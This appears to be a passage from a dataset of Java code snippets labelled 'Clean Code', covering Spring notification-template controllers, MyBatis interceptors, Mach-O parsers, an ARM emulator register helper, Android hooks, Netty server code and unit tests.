  @PutMapping(""/update"") @Operation(summary=""更新站内信模版"") @PreAuthorize(""@ss.hasPermission('system:notify-template:update')"") public CommonResult<Boolean> updateNotifyTemplate(  @Valid @RequestBody NotifyTemplateSaveReqVO updateReqVO){
    notifyTemplateService.updateNotifyTemplate(updateReqVO);
    return success(true);
  }
  @DeleteMapping(""/delete"") @Operation(summary=""删除站内信模版"") @Parameter(name=""id"",description=""编号"",required=true) @PreAuthorize(""@ss.hasPermission('system:notify-template:delete')"") public CommonResult<Boolean> deleteNotifyTemplate(  @RequestParam(""id"") Long id){
    notifyTemplateService.deleteNotifyTemplate(id);
    return success(true);
  }
  @GetMapping(""/get"") @Operation(summary=""获得站内信模版"") @Parameter(name=""id"",description=""编号"",required=true,example=""1024"") @PreAuthorize(""@ss.hasPermission('system:notify-template:query')"") public CommonResult<NotifyTemplateRespVO> getNotifyTemplate(  @RequestParam(""id"") Long id){
    NotifyTemplateDO template=notifyTemplateService.getNotifyTemplate(id);
    return success(BeanUtils.toBean(template,NotifyTemplateRespVO.class));
  }
  @GetMapping(""/page"") @Operation(summary=""获得站内信模版分页"") @PreAuthorize(""@ss.hasPermission('system:notify-template:query')"") public CommonResult<PageResult<NotifyTemplateRespVO>> getNotifyTemplatePage(  @Valid NotifyTemplatePageReqVO pageVO){
    PageResult<NotifyTemplateDO> pageResult=notifyTemplateService.getNotifyTemplatePage(pageVO);
    return success(BeanUtils.toBean(pageResult,NotifyTemplateRespVO.class));
  }
  @PostMapping(""/send-notify"") @Operation(summary=""发送站内信"") @PreAuthorize(""@ss.hasPermission('system:notify-template:send-notify')"") public CommonResult<Long> sendNotify(  @Valid @RequestBody NotifyTemplateSendReqVO sendReqVO){
    if (UserTypeEnum.MEMBER.getValue().equals(sendReqVO.getUserType())) {
      return success(notifySendService.sendSingleNotifyToMember(sendReqVO.getUserId(),sendReqVO.getTemplateCode(),sendReqVO.getTemplateParams()));
    }
 else {
      return success(notifySendService.sendSingleNotifyToAdmin(sendReqVO.getUserId(),sendReqVO.getTemplateCode(),sendReqVO.getTemplateParams()));
    }
  }
}
",0,Clean Code
"/** 
 * mybatis 数据权限拦截器
 */
@Slf4j @Intercepts({@Signature(type=StatementHandler.class,method=""prepare"",args={Connection.class,Integer.class})}) public class DataScopeInterceptor extends AbstractSqlParserHandler implements Interceptor {
  @Override @SneakyThrows public Object intercept(  Invocation invocation){
    StatementHandler statementHandler=(StatementHandler)PluginUtils.realTarget(invocation.getTarget());
    MetaObject metaObject=SystemMetaObject.forObject(statementHandler);
    this.sqlParser(metaObject);
    MappedStatement mappedStatement=(MappedStatement)metaObject.getValue(""delegate.mappedStatement"");
    if (!SqlCommandType.SELECT.equals(mappedStatement.getSqlCommandType())) {
      return invocation.proceed();
    }
    BoundSql boundSql=(BoundSql)metaObject.getValue(""delegate.boundSql"");
    String originalSql=boundSql.getSql();
    Object parameterObject=boundSql.getParameterObject();
    DataScope dataScope=findDataScopeObject(parameterObject);
    if (dataScope != null) {
      JwtUserDto currentUser=SecurityUtil.getDataUser();
      if (null != currentUser) {
        UserLoginDto user=currentUser.getUser();
      }
    }
    return invocation.proceed();
  }
  /** 
 * 生成拦截对象的代理
 * @param target 目标对象
 * @return 代理对象
 */
  @Override public Object plugin(  Object target){
    if (target instanceof StatementHandler) {
      return Plugin.wrap(target,this);
    }
    return target;
  }
  /** 
 * mybatis配置的属性
 * @param properties mybatis配置的属性
 */
  @Override public void setProperties(  Properties properties){
  }
  /** 
 * 查找参数是否包括DataScope对象
 * @param parameterObj 参数列表
 * @return DataScope
 */
  private DataScope findDataScopeObject(  Object parameterObj){
    if (parameterObj instanceof DataScope) {
      return (DataScope)parameterObj;
    }
 else     if (parameterObj instanceof Map) {
      for (      Object val : ((Map<?,?>)parameterObj).values()) {
        if (val instanceof DataScope) {
          return (DataScope)val;
        }
      }
    }
    return null;
  }
}",0,Clean Code
"/** 
 * 站内信 Service 实现类
 * @author xrcoder
 */
@Service @Validated public class NotifyMessageServiceImpl implements NotifyMessageService {
  @Resource private NotifyMessageMapper notifyMessageMapper;
  @Override public Long createNotifyMessage(  Long userId,  Integer userType,  NotifyTemplateDO template,  String templateContent,  Map<String,Object> templateParams){
    NotifyMessageDO message=new NotifyMessageDO().setUserId(userId).setUserType(userType).setTemplateId(template.getId()).setTemplateCode(template.getCode()).setTemplateType(template.getType()).setTemplateNickname(template.getNickname()).setTemplateContent(templateContent).setTemplateParams(templateParams).setReadStatus(false);
    notifyMessageMapper.insert(message);
    return message.getId();
  }
  @Override public PageResult<NotifyMessageDO> getNotifyMessagePage(  NotifyMessagePageReqVO pageReqVO){
    return notifyMessageMapper.selectPage(pageReqVO);
  }
  @Override public PageResult<NotifyMessageDO> getMyMyNotifyMessagePage(  NotifyMessageMyPageReqVO pageReqVO,  Long userId,  Integer userType){
    return notifyMessageMapper.selectPage(pageReqVO,userId,userType);
  }
  @Override public NotifyMessageDO getNotifyMessage(  Long id){
    return notifyMessageMapper.selectById(id);
  }
  @Override public List<NotifyMessageDO> getUnreadNotifyMessageList(  Long userId,  Integer userType,  Integer size){
    return notifyMessageMapper.selectUnreadListByUserIdAndUserType(userId,userType,size);
  }
  @Override public Long getUnreadNotifyMessageCount(  Long userId,  Integer userType){
    return notifyMessageMapper.selectUnreadCountByUserIdAndUserType(userId,userType);
  }
  @Override public int updateNotifyMessageRead(  Collection<Long> ids,  Long userId,  Integer userType){
    return notifyMessageMapper.updateListRead(ids,userId,userType);
  }
  @Override public int updateAllNotifyMessageRead(  Long userId,  Integer userType){
    return notifyMessageMapper.updateListRead(userId,userType);
  }
}
",0,Clean Code
"/** 
 * Not an important hook. Provide limited anti-crash feature for VasProfileCard, esp DIY card.
 */
@FunctionEntry public class VasProfileAntiCrash extends CommonDelayableHook {
  public static final VasProfileAntiCrash INSTANCE=new VasProfileAntiCrash();
  private VasProfileAntiCrash(){
    super(""__NOT_USED__"");
  }
  @Override public boolean initOnce(){
    try {
      String className=null;
      try {
        className=ConfigTable.INSTANCE.getConfig(VasProfileAntiCrash.class.getSimpleName());
      }
 catch (      Exception e) {
        Utils.log(e);
      }
      doHook(className);
      return true;
    }
 catch (    Throwable e) {
      log(e);
      return false;
    }
  }
  private void doHook(  String className){
    try {
      XposedBridge.hookAllMethods(JsonReader.class,""nextLong"",new XC_MethodHook(){
        @Override protected void afterHookedMethod(        MethodHookParam param) throws Throwable {
          if (!param.hasThrowable()) {
            return;
          }
          if (!Log.getStackTraceString(param.getThrowable()).contains(""FriendProfileCardActivity"")) {
            return;
          }
          param.setResult(0L);
        }
      }
);
    }
 catch (    Exception e) {
    }
    if (className == null) {
      return;
    }
    XC_MethodHook hook=new XC_MethodHook(){
      @Override protected void afterHookedMethod(      MethodHookParam param) throws Throwable {
        if (param.hasThrowable()) {
          param.setResult(0L);
        }
      }
    }
;
    Class<?> Card=Initiator.load(""com.tencent.mobileqq.data.Card"");
    if (HostInfo.requireMinQQVersion(QQVersion.QQ_8_6_0)) {
      XposedHelpers.findAndHookMethod(Initiator.load(className),""getDiyTemplateVersion"",Card,hook);
      return;
    }
    for (    Method m : Initiator.load(className).getDeclaredMethods()) {
      Class<?>[] argt;
      if (Modifier.isStatic(m.getModifiers()) && m.getName().equals(""a"") && m.getReturnType() == long.class && (argt=m.getParameterTypes()).length == 1 && argt[0] == Card) {
        XposedBridge.hookMethod(m,hook);
      }
    }
  }
  @Override public boolean isEnabled(){
    return true;
  }
  @Override public void setEnabled(  boolean enabled){
  }
}
",0,Clean Code
"public static class SuperBlob extends KaitaiStruct {
  public static SuperBlob fromFile(  String fileName) throws IOException {
    return new SuperBlob(new ByteBufferKaitaiStream(fileName));
  }
  public SuperBlob(  KaitaiStream _io){
    this(_io,null,null);
  }
  public SuperBlob(  KaitaiStream _io,  MachO.CsBlob _parent){
    this(_io,_parent,null);
  }
  public SuperBlob(  KaitaiStream _io,  MachO.CsBlob _parent,  MachO _root){
    super(_io);
    this._parent=_parent;
    this._root=_root;
    _read();
  }
  private void _read(){
    this.count=this._io.readU4be();
    this.blobs=new ArrayList<BlobIndex>();
    for (int i=0; i < count(); i++) {
      this.blobs.add(new BlobIndex(this._io,this,_root));
    }
  }
  private long count;
  private ArrayList<BlobIndex> blobs;
  private MachO _root;
  private MachO.CsBlob _parent;
  public long count(){
    return count;
  }
  public ArrayList<BlobIndex> blobs(){
    return blobs;
  }
  public MachO _root(){
    return _root;
  }
  public MachO.CsBlob _parent(){
    return _parent;
  }
}
",0,Clean Code
"public static class Match extends KaitaiStruct {
  public static Match fromFile(  String fileName) throws IOException {
    return new Match(new ByteBufferKaitaiStream(fileName));
  }
  public enum Op {  EXISTS(0x0L),   EQUAL(0x1L),   CONTAINS(0x2L),   BEGINS_WITH(0x3L),   ENDS_WITH(0x4L),   LESS_THAN(0x5L),   GREATER_THAN(0x6L),   LESS_EQUAL(0x7L),   GREATER_EQUAL(0x8L);   private final long id;
  Op(  long id){
    this.id=id;
  }
  public long id(){
    return id;
  }
  private static final Map<Long,Op> byId=new HashMap<Long,Op>(9);
static {
    for (    Op e : Op.values())     byId.put(e.id(),e);
  }
  public static Op byId(  long id){
    return byId.get(id);
  }
}
  public Match(  KaitaiStream _io){
    this(_io,null,null);
  }
  public Match(  KaitaiStream _io,  KaitaiStruct _parent){
    this(_io,_parent,null);
  }
  public Match(  KaitaiStream _io,  KaitaiStruct _parent,  MachO _root){
    super(_io);
    this._parent=_parent;
    this._root=_root;
    _read();
  }
  private void _read(){
    this.matchOp=Op.byId(this._io.readU4be());
    if (matchOp() != Op.EXISTS) {
      this.data=new Data(this._io,this,_root);
    }
  }
  private Op matchOp;
  private Data data;
  private MachO _root;
  private KaitaiStruct _parent;
  public Op matchOp(){
    return matchOp;
  }
  public Data data(){
    return data;
  }
  public MachO _root(){
    return _root;
  }
  public KaitaiStruct _parent(){
    return _parent;
  }
}
",0,Clean Code
"/** 
 * Data source dao 
 */
public interface DataSourceDao {
  /** 
 * Insert
 * @param dataSource data source
 */
  void insertOne(  DataSource dataSource);
  /** 
 * View detail
 * @param dataSourceId data source id
 * @return data source entity
 */
  DataSource selectOneDetail(  @Param(""dataSourceId"") Long dataSourceId);
  /** 
 * View detail by name
 * @param dataSourceName data source name
 * @return data source entity
 */
  DataSource selectOneDetailByName(  @Param(""dataSourceName"") String dataSourceName);
  /** 
 * View normal
 * @param dataSourceId data source id
 * @return data source entity
 */
  DataSource selectOne(  @Param(""dataSourceId"") Long dataSourceId);
  /** 
 * Select one by username
 * @param dataSourceName data source name
 * @return data source entity
 */
  DataSource selectOneByName(  @Param(""dataSourceName"") String dataSourceName);
  /** 
 * Delete One
 * @param dataSourceId data source id
 * @return affect row
 */
  int removeOne(  @Param(""dataSourceId"") Long dataSourceId);
  /** 
 * Expire One
 * @param dataSourceId data source id
 * @return affect row
 */
  int expireOne(  @Param(""dataSourceId"") Long dataSourceId);
  /** 
 * Update one
 * @param updatedOne updated one
 */
  void updateOne(  DataSource updatedOne);
  /** 
 * Page of query
 * @param dataSourceVo data source view entity
 * @return query list
 */
  List<DataSource> selectByPageVo(  DataSourceVo dataSourceVo);
  /** 
 * Find by id list
 * @param ids
 * @return
 */
  List<DataSource> selectByIds(  @Param(""ids"") List ids);
  /** 
 * update published version id
 * @param dataSourceId
 * @param versionId
 */
  int setPublishedVersionId(  @Param(""dataSourceId"") Long dataSourceId,  @Param(""versionId"") Long versionId);
  /** 
 * update version id
 * @param datasourceId
 * @param versionId
 */
  void updateVersionId(  @Param(""dataSourceId"") Long datasourceId,  @Param(""versionId"") long versionId);
}
",0,Clean Code
"public class Cpsr {
  private static boolean hasBit(  int value,  int offset){
    return ((value >> offset) & 1) == 1;
  }
  private void setBit(  int offset){
    int mask=1 << offset;
    value|=mask;
    backend.reg_write(regId,value);
  }
  private void clearBit(  int offset){
    int mask=~(1 << offset);
    value&=mask;
    backend.reg_write(regId,value);
  }
  public static Cpsr getArm(  Backend backend){
    return new Cpsr(backend,ArmConst.UC_ARM_REG_CPSR);
  }
  public static Cpsr getArm64(  Backend backend){
    return new Cpsr(backend,Arm64Const.UC_ARM64_REG_NZCV);
  }
  private final Backend backend;
  private final int regId;
  private int value;
  private Cpsr(  Backend backend,  int regId){
    this.backend=backend;
    this.regId=regId;
    this.value=backend.reg_read(regId).intValue();
  }
  public int getValue(){
    return value;
  }
  private static final int A32_BIT=4;
  public boolean isA32(){
    return hasBit(value,A32_BIT);
  }
  private static final int THUMB_BIT=5;
  public boolean isThumb(){
    return hasBit(value,THUMB_BIT);
  }
  private static final int NEGATIVE_BIT=31;
  public boolean isNegative(){
    return hasBit(value,NEGATIVE_BIT);
  }
  void setNegative(  boolean on){
    if (on) {
      setBit(NEGATIVE_BIT);
    }
 else {
      clearBit(NEGATIVE_BIT);
    }
  }
  private static final int ZERO_BIT=30;
  public boolean isZero(){
    return hasBit(value,ZERO_BIT);
  }
  void setZero(  boolean on){
    if (on) {
      setBit(ZERO_BIT);
    }
 else {
      clearBit(ZERO_BIT);
    }
  }
  private static final int CARRY_BIT=29;
  /** 
 * 进位或借位
 */
  public boolean hasCarry(){
    return hasBit(value,CARRY_BIT);
  }
  public void setCarry(  boolean on){
    if (on) {
      setBit(CARRY_BIT);
    }
 else {
      clearBit(CARRY_BIT);
    }
  }
  private static final int OVERFLOW_BIT=28;
  public boolean isOverflow(){
    return hasBit(value,OVERFLOW_BIT);
  }
  void setOverflow(  boolean on){
    if (on) {
      setBit(OVERFLOW_BIT);
    }
 else {
      clearBit(OVERFLOW_BIT);
    }
  }
  private static final int MODE_MASK=0x1f;
  public int getMode(){
    return value & MODE_MASK;
  }
  public int getEL(){
    return (value >> 2) & 3;
  }
  public final void switchUserMode(){
    value&=~MODE_MASK;
    value|=ARMEmulator.USR_MODE;
    backend.reg_write(regId,value);
  }
}
",0,Clean Code
"public class BufferedImageUtil {
  public static Color averageColor(  BufferedImage image){
    Color average=new Color();
    Color color=new Color();
    float[] buffer=null;
    int count=0;
    for (int x=0; x < image.getWidth(); x++) {
      for (int y=0; y < image.getHeight(); y++) {
        buffer=readPixel(image,x,y,color,buffer);
        count++;
        average.add(color.premultiplied());
      }
    }
    average.div(count);
    return average;
  }
  public static Color readPixel(  BufferedImage image,  int x,  int y,  @Nullable Color target){
    readPixel(image,x,y,target,null);
    return target;
  }
  private static float[] readPixel(  BufferedImage image,  int x,  int y,  @Nullable Color target,  float @Nullable [] buffer){
    if (target == null)     target=new Color();
    if (image.getType() == BufferedImage.TYPE_BYTE_GRAY) {
      buffer=readPixelDirect(image,x,y,target,buffer);
    }
 else {
      readPixelDefault(image,x,y,target);
    }
    return buffer;
  }
  private static void readPixelDefault(  BufferedImage image,  int x,  int y,  Color target){
    target.set(image.getRGB(x,y),image.getColorModel().isAlphaPremultiplied());
  }
  private static float[] readPixelDirect(  RenderedImage image,  int x,  int y,  Color target,  float @Nullable [] buffer){
    buffer=image.getData().getPixel(x,y,buffer);
    float a=buffer.length >= 4 ? buffer[3] / 255f : 1f;
    float r=buffer[0] / 255f;
    float g=buffer.length >= 3 ? buffer[1] / 255f : r;
    float b=buffer.length >= 3 ? buffer[2] / 255f : r;
    target.set(r,g,b,a,image.getColorModel().isAlphaPremultiplied());
    return buffer;
  }
}
",0,Clean Code
"/** 
 * netty_http
 */
public class NettyHttpServer extends Server {
  private Thread thread;
  @Override public void start(  final XxlRpcProviderFactory xxlRpcProviderFactory){
    thread=new Thread(() -> {
      final ThreadPoolExecutor serverHandlerPool=ThreadPoolUtil.makeServerThreadPool(NettyHttpServer.class.getSimpleName(),xxlRpcProviderFactory.getCorePoolSize(),xxlRpcProviderFactory.getMaxPoolSize());
      EventLoopGroup bossGroup=new NioEventLoopGroup();
      EventLoopGroup workerGroup=new NioEventLoopGroup();
      try {
        ServerBootstrap bootstrap=new ServerBootstrap();
        bootstrap.group(bossGroup,workerGroup).channel(NioServerSocketChannel.class).childHandler(new ChannelInitializer<SocketChannel>(){
          @Override public void initChannel(          SocketChannel channel){
            channel.pipeline().addLast(new IdleStateHandler(0,0,Beat.BEAT_INTERVAL * 3,TimeUnit.SECONDS)).addLast(new HttpServerCodec()).addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH)).addLast(new NettyHttpServerHandler(xxlRpcProviderFactory,serverHandlerPool));
          }
        }
).childOption(ChannelOption.SO_KEEPALIVE,true);
        ChannelFuture future=bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();
        logger.info("">>>>>>>>>>> xxl-rpc remoting server start success, nettype = {}, port = {}"",NettyHttpServer.class.getName(),xxlRpcProviderFactory.getPort());
        onStarted();
        future.channel().closeFuture().sync();
      }
 catch (      InterruptedException e) {
        if (e instanceof InterruptedException) {
          logger.info("">>>>>>>>>>> xxl-rpc remoting server stop."");
        }
 else {
          logger.error("">>>>>>>>>>> xxl-rpc remoting server error."",e);
        }
      }
 finally {
        try {
          serverHandlerPool.shutdown();
        }
 catch (        Exception e) {
          logger.error(e.getMessage(),e);
        }
        try {
          workerGroup.shutdownGracefully();
          bossGroup.shutdownGracefully();
        }
 catch (        Exception e) {
          logger.error(e.getMessage(),e);
        }
      }
    }
);
    thread.setDaemon(true);
    thread.start();
  }
  @Override public void stop(){
    if (thread != null && thread.isAlive()) {
      thread.interrupt();
    }
    onStopped();
    logger.info("">>>>>>>>>>> xxl-rpc remoting server destroy success."");
  }
}",0,Clean Code
"public class MethodProxyExecuter {
  @SuppressWarnings({""rawtypes""}) public static Object executeInterceptor(  MethodInterceptor[] interceptors,  CallbackFilter callbackFilter,  MethodInterceptor interceptor,  Class superClass,  String methodName,  Class[] argsType,  Object[] argsValue,  Object object){
    if (interceptor == null && interceptors == null && callbackFilter == null) {
      MethodProxy methodProxy=new MethodProxy(superClass,methodName,argsType);
      return methodProxy.invokeSuper(object,argsValue);
    }
    try {
      if (interceptors != null && callbackFilter != null) {
        MethodProxy methodProxy=new MethodProxy(superClass,methodName,argsType);
        return interceptors[callbackFilter.accept(object.getClass().getDeclaredMethod(methodName,argsType))].intercept(object,argsValue,methodProxy);
      }
      MethodProxy methodProxy=new MethodProxy(superClass,methodName,argsType);
      return interceptor.intercept(object,argsValue,methodProxy);
    }
 catch (    Exception e) {
      throw new ProxyException(e.getMessage(),e);
    }
  }
  @SuppressWarnings({""unchecked"",""rawtypes""}) public static Object executeMethod(  String methodName,  Class[] argsType,  Object[] argsValue,  Object object){
    try {
      Method method=findTargetMethod(methodName,argsType,object);
      if (method == null) {
        throw new ProxyException(""No such method："" + methodName + ""(""+ Arrays.toString(argsType)+ "")"");
      }
      return method.invoke(object,argsValue);
    }
 catch (    Exception e) {
      throw new ProxyException(e.getMessage(),e);
    }
  }
  /** 
 * 向父类查找方法
 * @param method
 * @param argsType
 * @param target
 * @return
 */
  private static Method findTargetMethod(  String method,  Class[] argsType,  Object target){
    Class currentClass=target.getClass();
    while (currentClass != null && currentClass != Object.class && !currentClass.isPrimitive()) {
      try {
        return currentClass.getMethod(method,argsType);
      }
 catch (      NoSuchMethodException e) {
        continue;
      }
    }
    return null;
  }
}
",0,Clean Code
"/** 
 * @author heps
 * @date 2019/8/18 17:16商品评价回复dto
 */
@Data public class CommentReplyDto implements Serializable {
  /** 
 * 评价回复id
 */
  private String id;
  /** 
 * 商品评价id
 */
  private String commentId;
  /** 
 * 评价回复自关联id(针对回复的回复)
 */
  private String parentId;
  /** 
 * 回复意见
 */
  private String content;
  /** 
 * 回复时间
 */
  private Date replyTime;
  /** 
 * 回复人昵称
 */
  private String replyNick;
  /** 
 * 回复人用户id
 */
  private Long userId;
  /** 
 * 是否删除
 */
  private Boolean isDeleted;
  /** 
 * 删除时间
 */
  private Date deletionTime;
  /** 
 * 删除用户id
 */
  private Long deletionUserId;
}",0,Clean Code
"public class addComment extends BackGroundActionListener {
  private IContextMenuInvocation invocation;
  addComment(  IContextMenuInvocation invocation){
    this.invocation=invocation;
  }
  @Override protected void action(){
    try {
      IHttpRequestResponse[] messages=getSelectedMessages(invocation);
      HelperPlus getter=BurpExtender.getHelperPlus();
      String comment=getCommentInfo();
      if (StringUtils.isEmpty(comment)) {
        return;
      }
      for (      IHttpRequestResponse message : messages) {
        String host=message.getHttpService().getHost();
        int port=message.getHttpService().getPort();
        List<LineEntry> entries=titlepanel.getTitleTable().getLineTableModel().findLineEntriesByHostAndPort(host,port);
        if (entries.size() == 0) {
        }
 else         if (entries.size() == 1) {
          addCommentForLine(entries.get(0),comment);
        }
 else {
          URL fullurl=getter.getFullURL(message);
          List<LineEntry> query_list=findLineEntryByFullUrl(entries,fullurl.toString());
          if (query_list.size() >= 1) {
            LineEntry item=query_list.get(query_list.size() - 1);
            addCommentForLine(item,comment);
          }
        }
      }
    }
 catch (    Exception e1) {
      e1.printStackTrace(stderr);
    }
  }
}
",0,Clean Code
"class SetGithubBindingActionTest {
  @Test void shouldDefineActionWithRequiredParameters(){
    DbClient dbClient=mock();
    UserSession userSession=mock();
    ComponentFinder componentFinder=mock();
    WebService.NewAction newAction=mock();
    when(newAction.setPost(anyBoolean())).thenReturn(newAction);
    WebService.NewParam repositoryParameter=mock();
    when(repositoryParameter.setMaximumLength(any(Integer.class))).thenReturn(repositoryParameter);
    when(repositoryParameter.setRequired(anyBoolean())).thenReturn(repositoryParameter);
    when(newAction.createParam(""repository"")).thenReturn(repositoryParameter);
    WebService.NewParam commentEnabledParameter=mock();
    when(commentEnabledParameter.setBooleanPossibleValues()).thenReturn(commentEnabledParameter);
    when(commentEnabledParameter.setRequired(anyBoolean())).thenReturn(commentEnabledParameter);
    when(newAction.createParam(""summaryCommentEnabled"")).thenReturn(commentEnabledParameter);
    WebService.NewParam almSettingParameter=mock();
    when(almSettingParameter.setMaximumLength(any(Integer.class))).thenReturn(almSettingParameter);
    when(almSettingParameter.setRequired(anyBoolean())).thenReturn(almSettingParameter);
    when(newAction.createParam(""almSetting"")).thenReturn(almSettingParameter);
    WebService.NewParam monoRepoParameter=mock();
    when(monoRepoParameter.setRequired(anyBoolean())).thenReturn(monoRepoParameter);
    when(newAction.createParam(""monorepo"")).thenReturn(monoRepoParameter);
    SetGithubBindingAction testCase=new SetGithubBindingAction(dbClient,componentFinder,userSession);
    testCase.configureAction(newAction);
    verify(newAction).setPost(true);
    verify(repositoryParameter).setRequired(true);
    verify(almSettingParameter).setRequired(true);
    verify(monoRepoParameter).setRequired(true);
    verify(monoRepoParameter).setBooleanPossibleValues();
  }
  @Test void shouldHandleRequestWithRequiredParmaeters(){
    DbClient dbClient=mock();
    UserSession userSession=mock();
    ComponentFinder componentFinder=mock();
    Request request=mock();
    when(request.mandatoryParam(""repository"")).thenReturn(""repository"");
    when(request.paramAsBoolean(""summaryCommentEnabled"")).thenReturn(true);
    SetGithubBindingAction testCase=new SetGithubBindingAction(dbClient,componentFinder,userSession);
    ProjectAlmSettingDto result=testCase.createProjectAlmSettingDto(""projectUuid"",""settingsUuid"",true,request);
    assertThat(result).usingRecursiveComparison().isEqualTo(new ProjectAlmSettingDto().setProjectUuid(""projectUuid"").setAlmSettingUuid(""settingsUuid"").setAlmRepo(""repository"").setSummaryCommentEnabled(true).setMonorepo(true));
  }
}
",0,Clean Code
"@ApiStatus.Experimental public interface Acquirable<T> {
  permits AcquirableImpl;
{
  }
  /** 
 * Gets all the  {@link Entity entities} being ticked in the current thread.<p> Useful when you want to ensure that no acquisition is ever done. <p> Be aware that the entity stream is only updated at the beginning of the thread tick.
 * @return the entities ticked in the current thread
 */
  static @NotNull Stream<@NotNull Entity> currentEntities(){
    final Thread currentThread=Thread.currentThread();
    if (currentThread instanceof TickThread) {
      return ((TickThread)currentThread).entries().stream().flatMap(partitionEntry -> partitionEntry.elements().stream()).filter(tickable -> tickable instanceof Entity).map(tickable -> (Entity)tickable);
    }
    return Stream.empty();
  }
  /** 
 * Retrieve and reset acquiring time.
 */
  @ApiStatus.Internal static long resetAcquiringTime(){
    return AcquirableImpl.WAIT_COUNTER_NANO.getAndSet(0);
  }
  /** 
 * Creates a new  {@link Acquirable} object.<p> Mostly for internal use, as a  {@link TickThread} has to be usedand properly synchronized.
 * @param value the acquirable element
 * @param < T >   the acquirable element type
 * @return a new acquirable object
 */
  @ApiStatus.Internal static <T>@NotNull Acquirable<T> of(  @NotNull T value){
    return new AcquirableImpl<>(value);
  }
  /** 
 * Returns a new  {@link Acquired} object which will be locked to the current thread.<p> Useful when your code cannot be done inside a callback and need to be sync. Do not forget to call  {@link Acquired#unlock()} once you are done with it.
 * @return an acquired object
 * @see #sync(Consumer) for auto-closeable capability
 */
  default @NotNull Acquired<T> lock(){
    return new Acquired<>(unwrap(),assignedThread());
  }
  /** 
 * Retrieves the acquirable value if and only if the element is already present/ticked in the current thread. <p> Useful when you want only want to acquire an element when you are guaranteed to do not create a huge performance impact.
 * @return an optional containing the acquired element if safe,{@link Optional#empty()} otherwise
 */
  default @NotNull Optional<T> local(){
    if (isLocal())     return Optional.of(unwrap());
    return Optional.empty();
  }
  /** 
 * Gets if the acquirable element is local to this thread
 * @return true if the element is linked to the current thread
 */
  default boolean isLocal(){
    return Thread.currentThread() == assignedThread();
  }
  /** 
 * Locks the acquirable element, execute  {@code consumer} synchronously and unlock the thread.<p> Free if the element is already present in the current thread, blocking otherwise.
 * @param consumer the callback to execute once the element has been safely acquired
 */
  default void sync(  @NotNull Consumer<T> consumer){
    Acquired<T> acquired=lock();
    try {
      consumer.accept(acquired.get());
    }
  finally {
      acquired.unlock();
    }
  }
  /** 
 * Unwrap the contained object unsafely. <p> Should only be considered when thread-safety is not necessary (e.g. comparing positions)
 * @return the unwrapped value
 */
  @NotNull T unwrap();
  @ApiStatus.Internal @NotNull TickThread assignedThread();
}
",0,Clean Code
"/** 
 * @author cai.wen created on 2019/10/17 11:25
 */
public class DumpTask implements Task {
  private static final Logger logger=BistouryLoggger.getLogger();
  private final Lock lock=new ReentrantLock();
  private volatile boolean isDump=false;
  private final ProfilerDataDumper dataDumper;
  public DumpTask(){
    this.dataDumper=new ProfilerDataDumper();
  }
  private void doDump(){
    lock.lock();
    try {
      if (isDump) {
        logger.warn(""profiler data is already dump."");
        return;
      }
      dataDumper.dump();
      isDump=true;
    }
  finally {
      lock.unlock();
    }
  }
  @Override public void init(){
  }
  @Override public void stop(){
    doDump();
    ProfilerData.reset();
  }
}
",0,Clean Code
"private static class ViewWrapper {
  private final View view;
  private final ShapeDrawable drawable;
  public ViewWrapper(  Context context){
    view=new View(context);
    int viewRadius=ScreenUtil.dip2px(1.5f);
    float[] radius={viewRadius,viewRadius,viewRadius,viewRadius,viewRadius,viewRadius,viewRadius,viewRadius};
    RoundRectShape shape=new RoundRectShape(radius,null,null);
    drawable=new ShapeDrawable(shape);
    drawable.getPaint().setStyle(Paint.Style.FILL_AND_STROKE);
    drawable.getPaint().setAntiAlias(true);
    drawable.getPaint().setColor(context.getResources().getColor(R.color.community_banner_normal_color));
    LayoutParams params=new LayoutParams(ScreenUtil.dip2px(8),ScreenUtil.dip2px(3));
    params.gravity=Gravity.CENTER;
    params.rightMargin=ScreenUtil.dip2px(3);
    view.setLayoutParams(params);
    view.setBackground(drawable);
  }
  public View getView(){
    return view;
  }
  public void setBackgroundColor(  int color){
    drawable.getPaint().setColor(color);
    drawable.invalidateSelf();
  }
  public void setWidth(  int width){
    ViewGroup.LayoutParams layoutParams=view.getLayoutParams();
    layoutParams.width=width;
    view.setLayoutParams(layoutParams);
    view.requestLayout();
  }
  public int getWidth(){
    ViewGroup.LayoutParams layoutParams=view.getLayoutParams();
    return layoutParams.width;
  }
}
",0,Clean Code
"public class WaitForCaseTest {
  @Inject FlowRepositoryInterface flowRepository;
  @Inject protected RunnerUtils runnerUtils;
  public void waitfor() throws TimeoutException, QueueException {
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""waitfor"");
    assertThat(execution.getState().getCurrent(),is(State.Type.SUCCESS));
    assertThat(execution.getTaskRunList().getFirst().getOutputs(),notNullValue());
  }
  public void waitforMaxIterations() throws TimeoutException, QueueException {
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""waitfor-max-iterations"");
    assertThat(execution.getState().getCurrent(),is(State.Type.FAILED));
  }
  public void waitforMaxDuration() throws TimeoutException, QueueException {
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""waitfor-max-duration"");
    assertThat(execution.getState().getCurrent(),is(State.Type.FAILED));
  }
  public void waitforNoSuccess() throws TimeoutException, QueueException {
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""waitfor-no-success"");
    assertThat(execution.getState().getCurrent(),is(State.Type.SUCCESS));
  }
  @SuppressWarnings(""unchecked"") public void waitforMultipleTasks() throws TimeoutException, QueueException {
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""waitfor-multiple-tasks"");
    assertThat(execution.getState().getCurrent(),is(State.Type.SUCCESS));
    Map<String,Object> values=(Map<String,Object>)execution.getTaskRunList().getLast().getOutputs().get(""values"");
    assertThat(values.get(""count""),is(""4""));
  }
  public void waitforMultipleTasksFailed() throws TimeoutException, QueueException {
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""waitfor-multiple-tasks-failed"");
    assertThat(execution.getState().getCurrent(),is(State.Type.FAILED));
    assertThat(execution.getTaskRunList().getLast().attemptNumber(),is(1));
  }
  public void waitForChildTaskWarning() throws TimeoutException, QueueException {
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""waitfor-child-task-warning"");
    assertThat(execution.getState().getCurrent(),is(State.Type.FAILED));
    assertThat((Integer)execution.getTaskRunList().getFirst().getOutputs().get(""iterationCount""),greaterThan(1));
  }
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public class ConnectionRefreshTest {
  @Ignore @Test public void simulation() throws InterruptedException {
